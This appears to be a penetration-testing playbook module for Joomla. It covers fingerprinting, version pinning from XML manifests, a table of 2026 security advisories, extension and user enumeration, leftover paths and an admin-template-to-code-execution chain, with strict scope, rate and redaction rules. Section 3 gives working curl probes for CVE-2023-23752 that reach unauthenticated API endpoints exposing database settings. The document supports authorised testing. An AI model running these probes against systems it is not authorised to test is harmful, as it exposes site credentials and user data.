# Joomla

Joomla's distinguishing feature for a hunter is the Security Centre: the project
publishes one announcement per issue, each with an explicit affected-version
range and the fixed release. That makes version-to-advisory mapping precise, so
the work is pinning the version accurately and then enumerating extensions.

All probes here are **Stage A (read-only)** unless a heading says Stage B.
Serial, one request at a time, 1.5s base plus up to 1.5s jitter. Caps per host:
15 version requests, 200 extension probes, 50 user probes, 25 leftover paths.

```bash
# Define this before any loop below. Never tighten it to finish a list faster.
pace() { sleep "$(awk -v s=$RANDOM 'BEGIN{srand(s);print 1.5+rand()*1.5}')"; }
```

## 1. Fingerprint corroboration

| Artifact | Request | What it proves |
|---|---|---|
| Generator meta | `<meta name="generator" content="Joomla! - Open Source Content Management" />` | Joomla, usually without a version |
| Core media paths | `/media/system/js/`, `/media/jui/`, `/media/vendor/` in the baseline HTML | Joomla layout |
| Administrator entry | `GET /administrator/` | The back-office front door exists |
| Component routing | `/index.php?option=com_<name>` answering sensibly | Joomla's component router |
| `robots.txt` | The shipped file carries distinctive comments about relocating it when Joomla is installed in a subfolder | Joomla, and whether it is in a subdirectory |

The `robots.txt` note is a useful subdirectory tell: Joomla's own file states
that if the site is installed inside a folder, `robots.txt` must be moved to the
site root and the folder name prefixed to every path. A root `robots.txt` with
prefixed paths points you at the real application root.

## 2. Version pinning

Joomla ships several XML manifests that carry a version, and they are frequently
left readable even when the generator tag is cleaned.

```bash
T="https://target.example"
# Most precise: the core files manifest in the administrator tree
curl -s -m 15 "$T/administrator/manifests/files/joomla.xml" | grep -oE '<version>[^<]+'
# Language pack manifest, a good second artifact
curl -s -m 15 "$T/language/en-GB/en-GB.xml" | grep -oE '<version>[^<]+'
# A core plugin manifest gives an approximate branch when the others are blocked
curl -s -m 15 "$T/plugins/system/cache/cache.xml" | grep -oE '<version>[^<]+'
# Install package readme, present on sites that never cleaned up
curl -s -m 15 "$T/README.txt" | head -5
```

Then establish what the current release is per branch, rather than recalling it:

```bash
curl -s https://update.joomla.org/core/extension.xml | \
  grep -oE '<name>[^<]+|<version>[^<]+' | tail -20
```

As published by the project in late September 2026, the current releases were
5.4.9 and 6.1.4. Re-check; the method is the point. Note that 5.4.9 shipped with
a documented regression affecting Web Services API PATCH requests, with a
permanent fix planned for 5.4.10, so a site deliberately held back one release
may have a reason. Do not treat "not on the newest point release" as negligence
without checking the project's own release notes.

The project also publishes opt-in usage statistics at
`https://developer.joomla.org/stats/cms_version`, which is useful for framing a
report ("this branch represents N percent of installs") but is never evidence
about the target.

## 3. Verified core advisories

Read from the Joomla Security Centre (<https://developer.joomla.org/security-centre.html>)
this session. All of the 2026 rows below were fixed in 5.4.9 and 6.1.4.

| Announcement | CVE | Severity | Affected | What it is |
|---|---|---|---|---|
| 20260909 | CVE-2026-92222 | High | 4.0.0 to 5.4.8; 6.0.0 to 6.1.3 (the announcement's version field starts at 3.0.0, its affected-installs field at 4.0.0) | Server-side request URLs improperly validated, giving SSRF. Confirm with `hunt-ssrf` discipline: a canary callback attributed to one parameter. |
| 20260914 | CVE-2026-92227 | Moderate severity, High impact | 4.0.0 to 5.4.8; 6.0.0 to 6.1.3 | A remember-me cookie is issued too early in the login flow, allowing multi-factor authentication to be bypassed. |
| 20260913 | CVE-2026-92226 | Moderate severity, High impact | 4.0.0 to 5.4.8; 6.0.0 to 6.1.3 | Improper access checks let unauthorised users edit items they should not be able to edit. |
| 20260915 | CVE-2026-92231 | Moderate | 1.5.0 to 5.4.8; 6.0.0 to 6.1.3 | The attribute filter checks for `javascript:` before decoding HTML5 entities, so an entity-encoded scheme survives the filter. |
| 20260916 | CVE-2026-92232 | Moderate | 1.5.0 to 5.4.8; 6.0.0 to 6.1.3 | Whitespace characters bypass the attribute cleaner for HTML data URIs. |
| 20260912 | CVE-2026-92225 | Moderate | 4.0.0 to 5.4.8; 6.0.0 to 6.1.3 | The module list layout does not escape user-supplied values. |
| 20260911 | CVE-2026-92224 | Moderate | 4.0.0 to 5.4.8; 6.0.0 to 6.1.3 | The link toolbar layout does not escape inputs. |
| 20260910 | CVE-2026-92223 | Moderate, Low impact | 5.0.0 to 5.4.8; 6.0.0 to 6.1.3 | Improper access checks allow changing the workflow stage of inaccessible content. |
| 20260908 | CVE-2026-90918 | Moderate | 4.0.0 to 5.4.8; 6.0.0 to 6.1.3 | Mail template feature lacks escaping, producing XSS across several extensions. |

Older but still the highest-yield Joomla finding in the wild, because
unmaintained 4.x installs are everywhere:

| CVE | Affected | What it is | Score |
|---|---|---|---|
| CVE-2023-23752 | Joomla 4.0.0 through 4.2.7 | An improper access check allows unauthorised access to web-service endpoints. | CVSS 3.1 5.3 Medium (NVD). The score understates it: the exposed configuration endpoint returns the application's database settings. |

Source: <https://nvd.nist.gov/vuln/detail/CVE-2023-23752>.

### Stage A probe for CVE-2023-23752, with evidence handling

```bash
# Stage A. Read-only. Two routes, both documented for this issue.
curl -s -o /tmp/j-users.json  -w 'users  %{http_code} %{size_download}\n' -m 15 \
  "$T/api/index.php/v1/users?public=true"
curl -s -o /tmp/j-config.json -w 'config %{http_code} %{size_download}\n' -m 15 \
  "$T/api/index.php/v1/config/application?public=true"
# Confirm structure WITHOUT printing secrets into your transcript.
python3 -I -c '
import json
d=json.load(open("/tmp/j-config.json"))
items=d.get("data",d)
keys=sorted({k for it in (items if isinstance(items,list) else [items]) for k in (it.get("attributes",{}) if isinstance(it,dict) else {})})
print("attribute keys present:", keys[:40])
'
```

The presence of database and mail attribute keys in a 200 response is the
finding. **Redact the values before anything reaches a report or a note**, and
treat any attempt to use a credential found here as a separate Stage B action
needing its own sign-off. `evidence-hygiene` owns the redaction workflow.

Exposure depends on which API routes the deployment exposes, so a 404 on these
paths does not prove the version is patched. Pin the version independently.

## 4. Extension enumeration

Joomla extensions come in four kinds and each has a predictable location and
manifest:

| Kind | Location | Version artifact |
|---|---|---|
| Component | `/components/com_<name>/`, admin side `/administrator/components/com_<name>/` | `<name>.xml` in the administrator component directory |
| Module | `/modules/mod_<name>/` | `mod_<name>.xml` |
| Plugin | `/plugins/<group>/<name>/` | `<name>.xml` |
| Template | `/templates/<name>/` | `templateDetails.xml` |

```bash
# Passive first: what the rendered page already loads
grep -oE '(com_|mod_)[a-z0-9_]+' /tmp/cms-baseline.html | sort -u
grep -oE '/(components|modules|plugins|templates)/[a-z0-9_-]+' /tmp/cms-baseline.html | sort -u

# Active confirmation, with the oracle controlled
for c in "<candidate>" "zz_not_real_$RANDOM"; do
  printf '%s ' "$c"
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' -m 15 \
    "$T/index.php?option=com_$c"
  pace
done
```

Third-party extension advisories are published in the project's Vulnerable
Extensions List (<https://vel.joomla.org/>), which is the Joomla equivalent of
the WordPress plugin databases and the right place to map a confirmed extension
and version to a known issue. Most real Joomla findings come from here, not from
core.

## 5. User enumeration

```bash
# The login form's error text historically distinguishes a wrong password from
# an unknown user on some configurations. Compare bodies, not status codes.
curl -s -m 15 -o /tmp/j-login.html "$T/index.php?option=com_users&view=login"
# The password-reset flow reports existence clearly on many installs.
# It sends mail to a real person: Stage B unless the engagement allows it.
```

If CVE-2023-23752 is live, the users route above is the cheapest and safest
enumeration channel and needs no form submission. Otherwise, cross-check two
channels before asserting a username, and do not proceed to password guessing
(`hunt-brute-force`).

The administrator login at `/administrator/index.php?option=com_login` accepting
native Joomla credentials independently of a front-site SSO layer is owned by
`hunt-auth-bypass` and its Legacy-Protocol Matrix.

## 6. Leftover and misconfiguration paths

Detect only. **Never submit the installer form**: Joomla's installer can
reinitialise the database.

| Path | Meaning |
|---|---|
| `/installation/` | The installer directory was not removed. Joomla refuses to run with it present on a configured site, which is itself a tell that the site is unconfigured or broken. Detect and stop. |
| `/configuration.php-dist`, `/configuration.php.bak`, `.old`, `~` | Configuration leftovers served as text. Confirm readability, do not harvest. |
| `/administrator/logs/`, `/logs/` | Error logs with full paths, SQL fragments and sometimes tokens. |
| `/tmp/`, `/cache/` with directory listing | Extension installation leftovers, including uploaded packages. |
| `/web.config.txt`, `/htaccess.txt` | Shipped sample server configuration, which confirms Joomla and sometimes the intended hardening that was never applied. |
| `/api/index.php/v1/` | The Web Services API is routed. Enumerate which routes answer anonymously; this is where CVE-2023-23752 and related access-check issues surface. |

## 7. Admin-to-RCE, Stage B

An administrator can edit a template's PHP files from the back end
(Templates, then a template name, then a file such as the error template), which
reaches PHP execution at the template's public path. **This is intended Joomla
behaviour.** On its own it is not a finding; see the grading table in SKILL.md.

It becomes a finding as the second half of a chain whose first half you have
proven: the MFA bypass above, an improper access check that reaches an
administrator-only view, or a stored XSS that an administrator will render.

**Stage B, sign-off required**, tester-owned install only: insert an inert
marker into a template file, request the template path to show it was evaluated,
then restore the original file byte for byte and record the restore. Keep the
original content before you edit it. Never leave executable content behind, and
never do this on a production site.

Published Joomla "XSS to RCE" frameworks automate administrator-session abuse to
create a user and edit a built-in template. Do not run third-party exploitation
frameworks against a client site; describe the chain and cite the advisory.

## 8. False-positive killers specific to Joomla

- **A blocked manifest is not a patched site.** `joomla.xml` being 403 says
  nothing about the version. Use the language manifest or a core plugin manifest.
- **A 404 on `/api/index.php/v1/...` does not prove CVE-2023-23752 is fixed.**
  The API may be disabled or routed differently. Pin the version separately.
- **The configuration endpoint's response may be a cached or proxied error.**
  Diff against the saved baseline and require actual attribute keys.
- **An extension answering `option=com_<name>` may be core, not third party.**
  Core ships many `com_` components. Check the manifest's author before claiming
  a third-party extension is installed.
- **Severity inflation on filter-bypass XSS.** Several 2026 advisories are
  attribute-filter bypasses, which need a context where user HTML is rendered.
  Prove the context, do not assert it from the CVE alone.
- **A subdirectory install breaks every path above.** Re-root the whole probe
  set at the real application root before concluding anything is absent.
